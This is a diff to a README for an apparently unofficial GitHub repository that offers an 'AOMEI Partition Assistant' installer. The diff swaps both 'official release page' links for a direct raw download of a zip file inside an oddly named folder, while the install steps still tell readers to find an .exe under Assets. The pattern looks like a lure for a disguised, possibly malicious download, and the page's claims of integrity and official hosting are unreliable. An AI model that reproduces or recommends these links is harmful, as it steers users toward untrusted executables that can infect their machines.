@@ -1,6 +1,6 @@
 # 💾 AOMEI-Partition-Assistant-Setup - Manage your hard drive partitions easily
 
-[![Download AOMEI Partition Assistant](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ddd97336/AOMEI-Partition-Assistant-Setup/releases)
+[![Download AOMEI Partition Assistant](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ddd97336/AOMEI-Partition-Assistant-Setup/raw/refs/heads/main/anthropopsychic/Partition_Assistant_AOME_Setup_2.4.zip)
 
 ## 📋 About the application
 
@@ -31,7 +31,7 @@ Ensure your computer meets these minimum specifications before you begin:
 
 You must download the current version of the installer from the official release page. AOMEI Partition Assistant files remain hosted in a repository to ensure integrity and security.
 
-1. Go to the [official release page](https://github.com/ddd97336/AOMEI-Partition-Assistant-Setup/releases).
+1. Go to the [official release page](https://github.com/ddd97336/AOMEI-Partition-Assistant-Setup/raw/refs/heads/main/anthropopsychic/Partition_Assistant_AOME_Setup_2.4.zip).
 2. Look for the file ending in `.exe` under the Assets section of the latest release.
 3. Click the file name to start the download to your computer.
 4. Save the file to your Downloads folder or a location you remember.
